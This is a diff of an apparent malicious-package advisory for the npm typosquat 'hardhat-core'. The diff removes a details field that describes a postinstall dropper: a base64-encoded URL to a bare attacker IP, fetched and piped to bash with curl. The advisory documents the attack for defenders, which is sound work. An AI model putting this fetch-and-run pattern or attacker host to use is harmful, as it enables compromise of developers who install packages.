@@ -4,7 +4,6 @@
   "published": "2026-05-13T12:01:29Z",
   "modified": "2026-05-15T07:50:30.529002Z",
   "summary": "Malicious code in hardhat-core (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (bb86c79e7ed3cd429c0f28bc08e00ce020df2ec42fdda086ad8bfca99f259930)\npackage.json declares a postinstall script that base64-decodes the string 'aHR0cDovLzguMjE3Ljc1LjE0NzozMDAwL3BheWxvYWQ=' to the URL http://8.217.75.147:3000/payload and pipes the response into bash via `curl -s <url> | bash`. This fires automatically during `npm install`, executing attacker-controlled shell code fetched over plain HTTP from a hardcoded bare IP with no integrity verification. The package itself is empty (index.js exports `{}`) and its name impersonates the widely-used `hardhat` Ethereum tooling \u2014 the only purpose of installing it is to trigger the dropper. Three independent block signals are present: install-time curl|bash to a non-publisher bare IP, base64-obfuscated URL inside a lifecycle script, and a typosquat name with no real functionality serving as the lure.\n\n## Source: ossf-package-analysis (37a9993551389729247a4d3b88747296e12dc861db457d83581f0e60cd4d0c30)\nThe OpenSSF Package Analysis project identified 'hardhat-core' @ 1.0.0 (npm) as malicious.\n\nIt is considered malicious because:\n\n- The package executes one or more commands associated with malicious behavior.\n",
   "affected": [
     {
       "package": {
